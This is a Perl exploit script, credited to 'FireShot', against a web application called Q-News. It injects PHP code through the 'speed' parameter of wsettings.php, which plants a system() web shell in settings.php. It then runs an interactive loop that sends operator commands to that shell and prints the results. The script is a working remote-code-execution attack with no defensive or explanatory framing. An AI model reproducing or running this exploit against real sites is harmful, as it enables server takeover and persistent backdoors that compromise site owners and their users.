#!/usr/bin/perl


use HTTP::Request;
use LWP::UserAgent;

my $host  =  $ARGV[0];
my $vuln  =  "/wsettings.php?speed=";
my $rce   =  "/settings.php?cmd=";
my $evil  =  "';system(\$_GET[cmd]);\$x = '";

my $inj_url = $host.$vuln.$evil;
my $rce_url = $host.$rce;

($host) || die " usage= perl $0 site \n"; 

print "------------------------\n";
print "   Q-News RCE Exploit   \n";
print "       by FireShot      \n";
print "------------------------\n\n";

$response = get($inj_url);
if ($response =~ /Successfully saved settings/) {
    &shell;
}
else {
    print "error \n";
    exit(0);
}

sub shell {
    print "FireShot-shell: ";
    my $cmd = <STDIN>;
    $cmd !~ /quit/ || die " exit \n";
    my $url = $rce_url.$cmd;
    my $re = get($url);
    if ($re =~ /(.)/) {
        print $re;
    }
    else {
        print "command unknow \n";
    }
    &shell;
}

sub get() {
    my $url = $_[0];
    my $req = HTTP::Request->new(GET => $url);
    my $agent  = LWP::UserAgent->new();
    $agent->timeout(4);
    my $response = $agent->request($req);
    return $response->content;
}
